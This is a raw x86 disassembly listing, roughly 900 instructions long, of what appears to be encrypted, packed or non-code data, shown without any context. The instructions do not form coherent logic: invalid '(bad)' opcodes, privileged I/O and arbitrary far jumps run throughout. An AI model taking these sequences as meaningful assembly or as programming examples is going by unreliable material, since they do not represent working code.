  420d7e:	sbb    esp,DWORD PTR [edi-0x3dad5740]
  420d84:	rcl    DWORD PTR [esi-0x54],1
  420d87:	push   esi
  420d88:	(bad)  
  420d89:	push   edx
  420d8a:	jge    0x420d7f
  420d8c:	push   ebp
  420d8d:	into   
  420d8e:	dec    eax
  420d8f:	jmp    0x1774:0x9a17d519
  420d96:	push   cs
  420d97:	shl    BYTE PTR [ecx+0x6c41e9be],1
  420d9d:	neg    DWORD PTR [ebx+0xe40f6f]
  420da3:	cld    
  420da4:	xor    BYTE PTR [ebp+0x4cea17],bh
  420daa:	mov    cl,al
  420dac:	adc    al,0xfd
  420dae:	fist   DWORD PTR [edi+0x2997099b]
  420db4:	ret    
  420db5:	and    ah,BYTE PTR ds:0xda4a94a1
  420dbb:	adc    esi,ebp
  420dbd:	sbb    eax,0xaee099dd
  420dc2:	adc    DWORD PTR [ebp+edx*1-0x4e07b660],eax
  420dc9:	or     ebp,DWORD PTR [edi-0x1b]
  420dcc:	xor    ecx,edi
  420dce:	cmp    eax,0x8b91f8cf
  420dd3:	pushf  
  420dd4:	in     eax,0x47
  420dd6:	icebp  
  420dd7:	add    DWORD PTR [ebx-0x60],ebx
  420dda:	jmp    0x38d2:0xe8a79623
  420de1:	or     BYTE PTR [ecx-0x7a2c57f1],0xa0
  420de8:	inc    ecx
  420de9:	jle    0x420de4
  420deb:	pop    ebp
  420dec:	push   ss
  420ded:	xor    esp,esi
  420def:	xor    eax,0xdcfed734
  420df4:	fwait
  420df5:	iret   
  420df6:	fisttp WORD PTR [edx-0x4abb9bf5]
  420dfc:	mov    dl,0x5e
  420dfe:	sbb    edi,DWORD PTR [edx-0x14472f2f]
  420e04:	push   ss
  420e05:	mov    ecx,0x680554c6
  420e0a:	aas    
  420e0b:	imul   esp,DWORD PTR [eax],0x4
  420e0e:	mov    edx,DWORD PTR [edx]
  420e10:	loope  0x420e3e
  420e12:	mov    ds,WORD PTR [ecx-0x384b5073]
  420e18:	ins    DWORD PTR es:[edi],dx
  420e19:	cmp    DWORD PTR ds:0x234b18d4,eax
  420e1f:	add    eax,0x8e054275
  420e24:	or     al,0x3c
  420e26:	addr16 aaa 
  420e28:	adc    eax,0xa299246f
  420e2d:	cld    
  420e2e:	ins    BYTE PTR es:[edi],dx
  420e2f:	int3   
  420e30:	sbb    dl,BYTE PTR [ecx-0x6f63ca9]
  420e36:	std    
  420e37:	lea    edx,[edi]
  420e39:	sar    cl,1
  420e3b:	jno    0x420ea7
  420e3d:	test   al,0xd6
  420e3f:	mov    edi,ecx
  420e41:	push   0xb50a2b8f
  420e46:	adc    dl,dl
  420e48:	arpl   WORD PTR [edi],sp
  420e4a:	sub    BYTE PTR [edi+0xd],al
  420e4d:	cdq    
  420e4e:	mov    cl,0x3a
  420e50:	jns    0x420e8a
  420e52:	push   esi
  420e53:	arpl   ax,dx
  420e55:	jmp    0xf51f:0x446984fc
  420e5c:	into   
  420e5d:	les    edx,FWORD PTR [eax]
  420e5f:	xor    al,0x49
  420e61:	inc    esp
  420e62:	jb     0x420ed3
  420e64:	xor    eax,0xe3f859e
  420e69:	hlt    
  420e6a:	inc    edx
  420e6b:	cwde   
  420e6c:	lods   eax,DWORD PTR fs:[esi]
  420e6e:	jns    0x420e09
  420e70:	or     DWORD PTR [edx+0x3b],esp
  420e73:	dec    ecx
  420e74:	push   0x95099558
  420e79:	xor    eax,0x89229684
  420e7e:	fbld   TBYTE PTR [esi-0xe]
  420e81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e82:	fbstp  TBYTE PTR [edi]
  420e84:	test   bh,dl
  420e86:	xor    al,0xfe
  420e88:	add    ebx,esp
  420e8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e8b:	loopne 0x420e6b
  420e8d:	push   0xfffffff8
  420e8f:	xchg   ebx,eax
  420e90:	xor    DWORD PTR [ebx+0x0],ebx
  420e93:	mov    ecx,0xd8f15af6
  420e98:	cmp    ah,BYTE PTR [edi+0x16b5f746]
  420e9e:	outs   dx,DWORD PTR ds:[esi]
  420e9f:	and    DWORD PTR [edx+0xb9aeaee],ecx
  420ea5:	addr16 (bad) 
  420ea7:	fidiv  WORD PTR [edx]
  420ea9:	popf   
  420eaa:	sub    al,0x48
  420eac:	fs inc esi
  420eae:	sbb    eax,0xd623d4d8
  420eb3:	mov    edx,0x691e0771
  420eb8:	inc    ebp
  420eb9:	ror    DWORD PTR [ecx-0x45],0x4d
  420ebd:	cmc    
  420ebe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ebf:	and    bl,cl
  420ec1:	and    bl,dh
  420ec3:	push   0x2d
  420ec5:	test   al,0x6d
  420ec7:	shl    BYTE PTR [edx-0x2e70a29f],1
  420ecd:	jno    0x420e5b
  420ecf:	xlat   BYTE PTR ds:[ebx]
  420ed0:	push   edi
  420ed1:	out    dx,eax
  420ed2:	fisubr WORD PTR [ebx+eiz*1]
  420ed5:	push   0x50328aa5
  420eda:	mov    cl,0x52
  420edc:	inc    edx
  420edd:	mov    cl,0x18
  420edf:	or     BYTE PTR [ebp-0x4b],ch
  420ee2:	popa   
  420ee3:	test   al,0x3
  420ee5:	test   al,0xaf
  420ee7:	pop    esp
  420ee8:	dec    edi
  420ee9:	js     0x420e92
  420eeb:	loopne 0x420edf
  420eed:	loope  0x420eca
  420eef:	test   al,0xe9
  420ef1:	and    ebx,DWORD PTR [edi]
  420ef3:	jle    0x420f6b
  420ef5:	mov    bl,0xfb
  420ef7:	and    dh,dh
  420ef9:	mov    ebx,0x7207b7d
  420efe:	lock mov eax,ds:0x1f400156
  420f04:	xor    eax,edi
  420f06:	xor    al,0xc1
  420f08:	mov    esi,0x8d68939a
  420f0d:	mov    eax,0x3cedbc22
  420f12:	rol    ecx,0xb5
  420f15:	clc    
  420f16:	adc    eax,0x705e5e4e
  420f1b:	neg    esi
  420f1d:	dec    ebp
  420f1e:	mov    edi,0x288baa50
  420f23:	lock dec edx
  420f25:	adc    ebx,DWORD PTR [edx+0xb]
  420f28:	scas   eax,DWORD PTR es:[edi]
  420f29:	cmp    eax,0xff5c6dfb
  420f2e:	pop    es
  420f2f:	cdq    
  420f30:	push   ebx
  420f31:	in     eax,0xc7
  420f33:	adc    ecx,ebp
  420f35:	js     0x420f1f
  420f37:	shl    ebx,1
  420f39:	push   cs
  420f3a:	popf   
  420f3b:	loop   0x420ebf
  420f3d:	enter  0xd816,0x1c
  420f41:	fwait
  420f42:	mov    ds:0x2a73a07,al
  420f47:	push   edx
  420f48:	jne    0x420f04
  420f4a:	pusha  
  420f4b:	or     ch,cl
  420f4d:	jnp    0x420f7a
  420f4f:	adc    edx,DWORD PTR [ecx]
  420f51:	xor    BYTE PTR [ecx-0x42085bd0],dl
  420f57:	std    
  420f58:	es mov ch,0x24
  420f5b:	into   
  420f5c:	jne    0x420f75
  420f5e:	cmp    BYTE PTR [eax+0x5bc00dfb],bh
  420f64:	push   0xe479123d
  420f69:	xchg   esp,eax
  420f6a:	clc    
  420f6b:	pop    esi
  420f6c:	test   cl,al
  420f6e:	(bad)  
  420f6f:	xchg   ecx,eax
  420f70:	sbb    esi,DWORD PTR [edi-0x7ad48a26]
  420f76:	adc    eax,esi
  420f78:	pushf  
  420f79:	fimul  DWORD PTR [esi+eax*8-0x6ed36f64]
  420f80:	sbb    bl,BYTE PTR [eax+0x69c9d647]
  420f86:	aam    0xb9
  420f88:	pop    esp
  420f89:	push   edi
  420f8a:	imul   esp,DWORD PTR [ebx],0xfffffffa
  420f8d:	push   0xc
  420f8f:	cwde   
  420f90:	mov    BYTE PTR [ecx+0x109d551e],ah
  420f96:	stos   BYTE PTR es:[edi],al
  420f97:	aad    0xd3
  420f99:	adc    DWORD PTR [ebx-0x57],ebp
  420f9c:	dec    ecx
  420f9d:	nop
  420f9e:	xchg   DWORD PTR [ecx+0x42],eax
  420fa1:	ss js  0x420f82
  420fa4:	push   eax
  420fa5:	sub    BYTE PTR [edi-0x48],0x61
  420fa9:	dec    edx
  420faa:	inc    ebx
  420fab:	sbb    dl,BYTE PTR [edx]
  420fad:	icebp  
  420fae:	mov    esi,0x7c568684
  420fb3:	int3   
  420fb4:	call   0xa18d:0x536301a3
  420fbb:	cli    
  420fbc:	xchg   dh,ah
  420fbe:	mov    cl,0x88
  420fc0:	push   edi
  420fc1:	das    
  420fc2:	mov    bh,BYTE PTR [ebx]
  420fc4:	sub    cl,BYTE PTR ds:0xb1552785
  420fca:	shl    DWORD PTR [ebx+0x62191794],1
  420fd0:	iret   
  420fd1:	lahf   
  420fd2:	cmp    dl,BYTE PTR [edi+esi*4-0x65ad0880]
  420fd9:	xor    DWORD PTR [esi+0x45],ebp
  420fdc:	std    
  420fdd:	sub    BYTE PTR [ebx+0x5f76a436],ch
  420fe3:	call   0x53e4:0xe5bc8cdf
  420fea:	sub    dl,BYTE PTR [eax]
  420fec:	xlat   BYTE PTR ds:[ebx]
  420fed:	push   esi
  420fee:	sbb    BYTE PTR [esi+0x43],bh
  420ff1:	jg     0x421009
  420ff3:	dec    edi
  420ff4:	jb     0x420fd7
  420ff6:	shl    DWORD PTR [esi],cl
  420ff8:	or     ah,BYTE PTR [eax-0x6]
  420ffb:	push   DWORD PTR [esi-0x71]
  420ffe:	add    ch,0xfb
  421001:	stos   DWORD PTR es:[edi],eax
  421002:	dec    edx
  421003:	pushf  
  421004:	jnp    0x42102c
  421006:	xchg   eax,esp
  421008:	pop    ss
  421009:	pop    esi
  42100a:	cmp    BYTE PTR [esi],dl
  42100c:	test   ebp,edx
  42100e:	pop    ebp
  42100f:	(bad)  
  421011:	jl     0x42107c
  421013:	jno    0x420fae
  421015:	push   0x29
  421017:	(bad)  
  421019:	iret   
  42101a:	pop    ecx
  42101b:	mov    dh,0x4c
  42101d:	push   edx
  42101e:	fistp  QWORD PTR [edi]
  421020:	xchg   ecx,eax
  421021:	mov    ch,cl
  421023:	push   edi
  421024:	sub    BYTE PTR [ebx+0x1d],ch
  421027:	jmp    0xbfb0d79f
  42102c:	add    BYTE PTR [ecx],bl
  42102e:	push   ecx
  42102f:	(bad)  [eax]
  421031:	(bad)  
  421032:	or     DWORD PTR [ebp+0x39],0xac0d5866
  421039:	xchg   DWORD PTR ds:0x4321cdeb,ecx
  42103f:	int3   
  421040:	leave  
  421041:	sub    ch,al
  421043:	jae    0x421042
  421045:	and    DWORD PTR [esi-0x1b],esp
  421048:	xlat   BYTE PTR ds:[ebx]
  421049:	in     al,0xb3
  42104b:	sub    BYTE PTR [edx+0x3afac8f9],cl
  421051:	mov    es,WORD PTR [ecx+0x34]
  421054:	or     esp,DWORD PTR [edx+0x19]
  421057:	shl    edi,0x6
  42105a:	pushf  
  42105b:	js     0x421049
  42105d:	push   cs
  42105e:	bound  ebx,QWORD PTR [eax+eiz*4+0x75]
  421062:	mov    esi,0x83db82bd
  421067:	jno    0x421069
  421069:	pop    ds
  42106a:	clc    
  42106b:	add    BYTE PTR [edi-0x5],bl
  42106e:	jnp    0x4210ef
  421070:	test   DWORD PTR [edx+ebp*4],0x1f4a24a7
  421077:	mov    BYTE PTR [esp+eiz*8-0x71],al
  42107b:	mov    ds:0x53aaf33f,eax
  421080:	fs nop
  421082:	xchg   esp,eax
  421083:	loop   0x421092
  421085:	adc    eax,0x1c843bdd
  42108a:	push   eax
  42108b:	lods   al,BYTE PTR ds:[esi]
  42108c:	xor    esp,DWORD PTR [edi]
  42108e:	outs   dx,DWORD PTR ds:[esi]
  42108f:	jb     0x421051
  421091:	mov    dh,0xba
  421093:	fs push ebp
  421095:	xchg   esp,eax
  421096:	fucom  st(7)
  421098:	jle    0x4210a6
  42109a:	lods   al,BYTE PTR ds:[esi]
  42109b:	out    0xf2,eax
  42109d:	and    esp,edi
  42109f:	adc    BYTE PTR [ecx+0x45dd2f1b],al
  4210a5:	add    esi,DWORD PTR [edx]
  4210a7:	mov    bh,0x15
  4210a9:	push   esp
  4210aa:	or     eax,0x4dc85ba2
  4210af:	inc    ebp
  4210b0:	pop    ebx
  4210b1:	out    dx,al
  4210b2:	sbb    BYTE PTR [edx+0x38],ch
  4210b5:	xor    eax,0x84ef1d98
  4210ba:	or     al,0x34
  4210bc:	sbb    bh,BYTE PTR [eax-0x30]
  4210bf:	les    esi,FWORD PTR [edi]
  4210c1:	push   cs
  4210c2:	out    dx,eax
  4210c3:	jb     0x421073
  4210c5:	mov    ebx,0x70cc9244
  4210ca:	frstor [ebx+0x6a869366]
  4210d0:	push   esp
  4210d1:	sub    DWORD PTR [esi-0x6174e0ba],esp
  4210d7:	stc    
  4210d8:	sbb    dl,BYTE PTR [edi]
  4210da:	js     0x421145
  4210dc:	int    0x3e
  4210de:	push   ecx
  4210df:	test   DWORD PTR [edi-0x17f910f8],0x19aa8a93
  4210e9:	mov    bh,BYTE PTR [edx-0x5eeb48cf]
  4210ef:	js     0x42113b
  4210f1:	xor    BYTE PTR [esi],al
  4210f3:	addr16 mov al,ds:0x50d
  4210f7:	xchg   esp,eax
  4210f8:	inc    eax
  4210f9:	shrd   DWORD PTR [edx-0x4c3df1f0],eax,cl
  421100:	adc    DWORD PTR [ecx-0x2cd19e0c],ecx
  421106:	dec    ebp
  421107:	call   0x59d1fc6e
  42110c:	dec    ebx
  42110d:	cmp    eax,0x47a821c2
  421112:	jns    0x4210c7
  421114:	cmp    bl,BYTE PTR [ecx]
  421116:	mov    edi,0x7096fbc5
  42111b:	jo     0x421182
  42111d:	les    edi,FWORD PTR [edi+0x442af15f]
  421123:	or     DWORD PTR [edx-0x400376b1],eax
  421129:	sbb    BYTE PTR [ebx-0x18],al
  42112c:	add    DWORD PTR [edx+edi*8-0x12a78a47],esi
  421133:	add    bl,BYTE PTR [esi+eiz*4+0x2dfe703b]
  42113a:	ds pop ss
  42113c:	test   DWORD PTR [edi+0x56],0xd176656f
  421143:	dec    edi
  421144:	popf   
  421145:	xchg   ebx,eax
  421146:	outs   dx,DWORD PTR ds:[esi]
  421147:	mov    ah,0xb6
  421149:	push   ss
  42114a:	call   0x4464ad75
  42114f:	ds jae 0x421196
  421152:	outs   dx,BYTE PTR ds:[esi]
  421153:	sbb    eax,0x50fa6d85
  421158:	cmp    esi,0x5b
  42115b:	xchg   edi,eax
  42115c:	fcomp  DWORD PTR [edx+ebx*1-0x7e05b266]
  421163:	in     eax,dx
  421164:	stos   BYTE PTR es:[edi],al
  421165:	inc    ebx
  421166:	dec    ebx
  421167:	mov    ch,0x1a
  421169:	daa    
  42116a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42116b:	rol    DWORD PTR [edi+0x8],cl
  42116e:	test   cl,al
  421170:	pop    esp
  421171:	ins    DWORD PTR es:[edi],dx
  421172:	mov    al,0xa3
  421174:	sbb    eax,0x661eb756
  421179:	lods   al,BYTE PTR ds:[esi]
  42117a:	adc    eax,0x21594941
  42117f:	cmp    ebx,ecx
  421181:	fwait
  421182:	and    al,0x51
  421184:	push   ebp
  421185:	adc    BYTE PTR ds:0xf4f9a715,cl
  42118b:	call   0x16a0aabc
  421190:	and    al,0x81
  421192:	inc    ebp
  421193:	jb     0x421152
  421195:	or     edx,esi
  421197:	mov    dh,0xff
  421199:	sbb    BYTE PTR [ebp+0x30],ah
  42119c:	(bad)  
  42119d:	mov    ds:0x1d1b41f3,eax
  4211a2:	sbb    edi,eax
  4211a4:	jmp    0x50b4:0x6cad6369
  4211ab:	push   0xfffffff5
  4211ad:	jno    0x42121f
  4211af:	dec    ecx
  4211b0:	dec    eax
  4211b1:	loop   0x421217
  4211b3:	mov    ds:0xe656b17b,al
  4211b8:	hlt    
  4211b9:	icebp  
  4211ba:	bound  edi,QWORD PTR [ecx-0x9]
  4211bd:	adc    BYTE PTR [edx+0x59],dl
  4211c0:	jle    0x4211bb
  4211c2:	pop    ds
  4211c3:	jl     0x4211b3
  4211c5:	in     al,dx
  4211c6:	add    ebx,ecx
  4211c8:	out    dx,eax
  4211c9:	(bad)  
  4211ca:	in     eax,dx
  4211cb:	sub    DWORD PTR [ebx+0x72be3700],0xebe5de70
  4211d5:	mov    esi,0xfd41b795
  4211da:	sti    
  4211db:	loopne 0x42118d
  4211dd:	ficom  DWORD PTR [esi-0x4b]
  4211e0:	shl    ch,cl
  4211e2:	out    dx,eax
  4211e3:	jnp    0x42118c
  4211e5:	jbe    0x421240
  4211e7:	pop    ds
  4211e8:	punpcklbw mm0,DWORD PTR [ebx-0x4fdb5005]
  4211ef:	and    al,0x1a
  4211f1:	jmp    0x8f77:0x28b570dd
  4211f8:	jge    0x4211fd
  4211fa:	fiadd  WORD PTR [ebx+0xf]
  4211fd:	pop    edi
  4211fe:	inc    eax
  4211ff:	add    al,0x6e
  421201:	pop    esi
  421202:	cmp    eax,esp
  421204:	int3   
  421205:	dec    eax
  421206:	fldenv [ebx-0x61971b74]
  42120c:	or     BYTE PTR [esi+0x59],dh
  42120f:	xor    BYTE PTR [eax-0x53],cl
  421212:	xor    al,0x58
  421214:	icebp  
  421215:	xchg   bl,bh
  421217:	aam    0x28
  421219:	jnp    0x421202
  42121b:	and    esi,DWORD PTR [edx+0x5c]
  42121e:	mov    al,ah
  421220:	les    edx,FWORD PTR [eax+0x35]
  421223:	sub    dh,al
  421225:	scas   eax,DWORD PTR es:[edi]
  421226:	jg     0x421222
  421228:	imul   ebx,DWORD PTR [esi+0x1c53cb7c],0x13d511d7
  421232:	mov    ah,0x46
  421234:	push   ds
  421235:	aad    0xe8
  421237:	jg     0x421208
  421239:	imul   ebx,DWORD PTR [edx],0xa9456bd5
  42123f:	cmp    DWORD PTR [ecx+0x480ecfaa],eax
  421245:	xor    DWORD PTR ds:[edi-0x77f350dc],esp
  42124c:	push   0x634c1c5c
  421251:	leave  
  421252:	push   edx
  421253:	mov    ah,0xb7
  421255:	pop    edx
  421256:	int3   
  421257:	add    DWORD PTR [eax],edx
  421259:	icebp  
  42125a:	jecxz  0x421291
  42125c:	push   esp
  42125d:	lahf   
  42125e:	sbb    eax,0x6e058358
  421263:	sti    
  421264:	in     al,dx
  421265:	inc    ebp
  421266:	jno    0x421289
  421268:	dec    esp
  421269:	jl     0x42128a
  42126b:	test   eax,0x453a4bcc
  421270:	bound  edi,QWORD PTR [ecx+0x47]
  421273:	sbb    al,0xd5
  421275:	push   ss
  421276:	add    DWORD PTR [ecx+0x72],esp
  421279:	test   ch,cl
  42127b:	add    eax,0x980f95fb
  421280:	mov    ds:0xd583ee96,al
  421285:	fiadd  DWORD PTR [ebx+esi*2+0x1eb873c1]
  42128c:	and    eax,0x773b7620
  421291:	push   ebx
  421292:	sub    ah,ch
  421294:	(bad)  
  421295:	mov    eax,ds:0x6cf881b8
  42129a:	ds aaa 
  42129c:	and    dh,BYTE PTR [ecx]
  42129e:	es je  0x421236
  4212a1:	ret    0xab08
  4212a4:	cmp    ecx,esi
  4212a6:	cmp    dl,BYTE PTR [ebp-0x74e63d1c]
  4212ac:	int    0xad
  4212ae:	ror    BYTE PTR [ebp-0xd1553f4],1
  4212b4:	jecxz  0x421238
  4212b6:	jg     0x42131f
  4212b8:	xor    al,0xbe
  4212ba:	dec    ebp
  4212bb:	(bad)  
  4212bc:	fidivr WORD PTR [esi+0x541a11e6]
  4212c2:	mov    bh,cl
  4212c4:	ss ret 
  4212c6:	cmc    
  4212c7:	push   0xfbf29e71
  4212cc:	out    0x74,al
  4212ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212cf:	xor    DWORD PTR [eax],0x3b
  4212d2:	xchg   DWORD PTR [esi+0x308cea12],eax
  4212d8:	push   0x294883d5
  4212dd:	cmp    eax,0xbaba17af
  4212e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212e3:	retf   
  4212e4:	add    esi,DWORD PTR [edi-0xc]
  4212e7:	ss jnp 0x4212e7
  4212ea:	adc    al,BYTE PTR [edx-0x18]
  4212ed:	out    0x8e,al
  4212ef:	fbld   TBYTE PTR [edi]
  4212f1:	push   ebp
  4212f2:	sub    eax,edx
  4212f4:	test   al,0x23
  4212f6:	add    al,0x40
  4212f8:	(bad)  
  4212fa:	cmp    edx,DWORD PTR [eax-0x46944344]
  421300:	mov    ds:0x22635ef,eax
  421305:	mov    DWORD PTR [edi],ecx
  421307:	inc    DWORD PTR [edx+ecx*2]
  42130a:	adc    eax,0xc47f7b34
  42130f:	cwde   
  421310:	inc    ebx
  421311:	pop    eax
  421312:	xchg   BYTE PTR [edi],ch
  421314:	or     ch,bl
  421316:	in     al,0xa8
  421318:	push   esi
  421319:	and    eax,0x75a12b30
  42131e:	icebp  
  42131f:	cdq    
  421320:	add    dh,BYTE PTR [ebp-0x5aab2b0b]
  421326:	in     al,0xd
  421328:	je     0x42135f
  42132a:	(bad)  
  42132c:	jecxz  0x421319
  42132e:	fisttp WORD PTR [esi]
  421330:	mov    esp,0xc36a0f0
  421335:	scas   eax,DWORD PTR es:[edi]
  421336:	rol    BYTE PTR [ecx],0x1c
  421339:	sbb    eax,0xfce63fed
  42133e:	sahf   
  42133f:	pop    ebx
  421340:	xchg   esp,eax
  421341:	les    edx,FWORD PTR [ecx+0xdab03f6]
  421347:	cwde   
  421348:	jnp    0x421308
  42134a:	xlat   BYTE PTR ds:[ebx]
  42134b:	or     dh,BYTE PTR [esi+0x707e3338]
  421351:	js     0x42131b
  421353:	mov    ds,WORD PTR [ecx+eiz*2]
  421356:	sub    esi,esi
  421358:	ret    
  421359:	rol    esi,1
  42135b:	push   ecx
  42135c:	dec    eax
  42135d:	xor    ah,ch
  42135f:	mov    ebp,esi
  421361:	push   eax
  421362:	daa    
  421363:	mov    eax,0x41daeb7f
  421368:	pushf  
  421369:	jmp    0x421387
  42136b:	push   cs
  42136c:	ror    DWORD PTR [ebx+0x67],1
  42136f:	pop    esi
  421370:	push   ebx
  421371:	push   edx
  421372:	aas    
  421373:	shl    dh,0xca
  421376:	sub    dl,BYTE PTR [ecx-0x51]
  421379:	jecxz  0x4213c9
  42137b:	add    al,0x60
  42137d:	dec    ebp
  42137e:	pop    eax
  42137f:	push   edx
  421380:	xchg   edx,eax
  421381:	and    eax,0x5350747
  421386:	bound  esi,QWORD PTR [ecx+0x24]
  421389:	jno    0x42137c
  42138b:	mov    cl,0x73
  42138d:	fdivr  QWORD PTR [ecx+edi*4-0x1b624de]
  421394:	icebp  
  421395:	xlat   BYTE PTR ds:[ebx]
  421396:	jg     0x42139f
  421398:	in     al,dx
  421399:	jge    0x42133f
  42139b:	xchg   esi,eax
  42139c:	sub    DWORD PTR [edx-0x4778ad3b],0x78
  4213a3:	nop
  4213a4:	leave  
  4213a5:	enter  0x84ba,0xb7
  4213a9:	jbe    0x4213d5
  4213ab:	pop    eax
  4213ac:	outs   dx,BYTE PTR ds:[esi]
  4213ad:	mov    ebx,0x2e7ccef
  4213b2:	test   BYTE PTR [ebx],dh
  4213b4:	adc    dh,bl
  4213b6:	add    esp,DWORD PTR [ebx+0x62f6ce22]
  4213bc:	mov    esi,fs
  4213be:	ret    
  4213bf:	xor    dl,bl
  4213c1:	push   0xe92f1330
  4213c6:	and    eax,0x1702368d
  4213cb:	fidivr WORD PTR [ecx]
  4213cd:	jecxz  0x421420
  4213cf:	add    BYTE PTR [edx+0x24d08d64],al
  4213d5:	sub    DWORD PTR [eax-0x79],edi
  4213d8:	xor    al,0xf
  4213da:	or     DWORD PTR [ebp-0x12a5b93],esi
  4213e0:	lea    ebp,[esi+0x22]
  4213e3:	or     eax,DWORD PTR [ebx]
  4213e5:	adc    al,0xd3
  4213e7:	push   0xbfbf3216
  4213ec:	xor    al,0x4d
  4213ee:	mov    esp,0xc9bb254d
  4213f3:	jno    0x42142c
  4213f5:	hlt    
  4213f6:	xor    WORD PTR cs:[esi-0x2960d98],0x3afd
  421400:	sbb    DWORD PTR [edi+0x1ea6d7b3],ecx
  421406:	add    eax,0x2b594035
  42140b:	repz inc ebp
  42140d:	push   cs
  42140e:	sbb    cl,ch
  421410:	inc    ecx
  421411:	sbb    BYTE PTR [esi+0x61],ah
  421414:	cmp    bh,BYTE PTR [esi+0xa208cc9]
  42141a:	es fcomp st(7)
  42141d:	pop    edx
  42141e:	xchg   BYTE PTR [ebp-0x4943bd3e],bh
  421424:	int    0x86
  421426:	ffreep st(0)
  421428:	sbb    BYTE PTR gs:[ebx+0x247e334],dh
  42142f:	add    eax,0x70831c6
  421434:	sar    DWORD PTR [esi],cl
  421436:	adc    eax,esi
  421438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421439:	xlat   BYTE PTR ds:[ebx]
  42143a:	mov    BYTE PTR [ebx+0x74],cl
  42143d:	loop   0x4214aa
  42143f:	mov    dh,0xab
  421441:	or     eax,0x6ae30929
  421446:	test   BYTE PTR [esp+ebx*1-0x13],ah
  42144a:	jge    0x4213ea
  42144c:	inc    edi
  42144d:	cmp    ebx,eax
  42144f:	pop    ecx
  421450:	clc    
  421451:	mov    cl,0xec
  421453:	add    al,0x2c
  421455:	addr16 ss leave 
  421458:	mov    bh,0x4e
  42145a:	arpl   WORD PTR [ebp-0x3c46e75f],ax
  421460:	inc    edi
  421461:	retf   
  421462:	dec    ebx
  421463:	ret    0x8d2
  421466:	xchg   esi,eax
  421467:	enter  0xc664,0x45
  42146b:	inc    edx
  42146c:	push   0x26
  42146e:	pop    ebx
  42146f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421470:	dec    edi
  421471:	or     ebp,DWORD PTR [edx-0x275f6948]
  421477:	call   0x948ba017
  42147c:	push   0x710993a0
  421481:	sbb    DWORD PTR [edx-0x5f],0x7a30c808
  421488:	cmp    DWORD PTR [edx+0x53a2bd1b],esi
  42148e:	mov    esp,0xbd78f643
  421493:	add    ch,0x40
  421496:	cmp    DWORD PTR [esi],ebx
  421498:	fiadd  WORD PTR [eax]
  42149a:	jl     0x421488
  42149c:	inc    ecx
  42149d:	ins    DWORD PTR es:[edi],dx
  42149e:	sbb    BYTE PTR [esi],bl
  4214a0:	rol    BYTE PTR [ecx],1
  4214a2:	jl     0x421485
  4214a4:	and    ebx,DWORD PTR [edi]
  4214a6:	xchg   ecx,eax
  4214a7:	mov    edx,0x864f4faa
  4214ac:	pop    ds
  4214ad:	mov    ecx,0x6ea43b9
  4214b2:	retf   
  4214b3:	arpl   WORD PTR [esi-0x64],sp
  4214b6:	test   DWORD PTR [ecx+0x4f],esp
  4214b9:	aaa    
  4214ba:	inc    ebx
  4214bb:	push   ss
  4214bc:	and    ecx,ebx
  4214be:	pop    ds
  4214bf:	js     0x4214d2
  4214c1:	mov    ebx,0xccb9111e
  4214c6:	retf   0x192f
  4214c9:	adc    bl,BYTE PTR [ebp-0x69]
  4214cc:	sbb    esp,ebp
  4214ce:	add    BYTE PTR [eax+0x558c5d32],bh
  4214d4:	and    DWORD PTR [edi-0x65],esp
  4214d7:	pushf  
  4214d8:	dec    esp
  4214d9:	push   edx
  4214da:	cmc    
  4214db:	push   es
  4214dc:	pushf  
  4214dd:	xchg   esi,eax
  4214de:	repz (bad) 
  4214e0:	push   ebp
  4214e1:	in     al,dx
  4214e2:	mov    edx,0x8d4f3c74
  4214e7:	inc    ecx
  4214e8:	jae    0x42148c
  4214ea:	adc    ecx,edx
  4214ec:	mov    ds:0x482acf93,eax
  4214f1:	outs   dx,BYTE PTR ss:[esi]
  4214f3:	pop    ds
  4214f4:	push   ss
  4214f5:	into   
  4214f6:	pushf  
  4214f7:	enter  0x5eb0,0xf2
  4214fb:	mov    ecx,0x6228fe4f
  421500:	out    dx,eax
  421501:	ret    
  421502:	cs out dx,eax
  421504:	jp     0x4214a3
  421506:	push   esi
  421507:	pop    ebx
  421508:	hlt    
  421509:	xor    eax,0xa49f3c8c
  42150e:	or     ah,al
  421510:	aad    0x84
  421512:	test   eax,0x9b4495b7
  421517:	test   eax,0x1bf9d44f
  42151c:	pop    esp
  42151d:	jne    0x4214a0
  42151f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421520:	ret    
  421521:	mov    eax,0xa8ed9e2a
  421526:	or     DWORD PTR [esi+0xeb5ea23],edx
  42152c:	mov    eax,ds:0x513d39e4
  421531:	push   ecx
  421532:	test   eax,0x3400b4c6
  421537:	cdq    
  421538:	lds    esi,FWORD PTR [edi+0x69]
  42153b:	pop    ss
  42153c:	jge    0x421582
  42153e:	iret   
  42153f:	js     0x421501
  421541:	add    al,0x95
  421543:	adc    ecx,esi
  421545:	mov    edi,0xf6cf1b88
  42154a:	pushf  
  42154b:	lahf   
  42154c:	data16 mov ah,0xe
  42154f:	cmp    DWORD PTR [ebp-0x2ba4e95],0x5a
  421556:	pushf  
  421557:	js     0x42156b
  421559:	popf   
  42155a:	mov    eax,ds:0xd7d59b72
  42155f:	mov    eax,0xd48d6486
  421564:	or     edx,DWORD PTR [ebp+0x5282904f]
  42156a:	shl    DWORD PTR [ebx+0x63],0x3f
  42156e:	mov    bh,0xad
  421570:	mov    ebp,0x1a0e1a78
  421575:	(bad)  
  421576:	fcomip st,st(6)
  421578:	or     esi,DWORD PTR [esi+ebp*2-0x601776be]
  42157f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421580:	push   ebp
  421581:	jb     0x4215f3
  421583:	outs   dx,BYTE PTR ds:[esi]
  421584:	mov    al,ds:0x9f8c273d
  421589:	sub    cl,cl
  42158b:	pop    edx
  42158c:	cmp    BYTE PTR [esi],al
  42158e:	pusha  
  42158f:	mov    fs,eax
  421591:	jno    0x4215ea
  421593:	inc    ebx
  421594:	add    BYTE PTR [edx-0x2f],ah
  421597:	ds sbb al,0xf9
  42159a:	mov    ebp,0xfb894f4c
  42159f:	mov    ds:0xa3bed43a,al
  4215a4:	push   ebp
  4215a5:	daa    
  4215a6:	lahf   
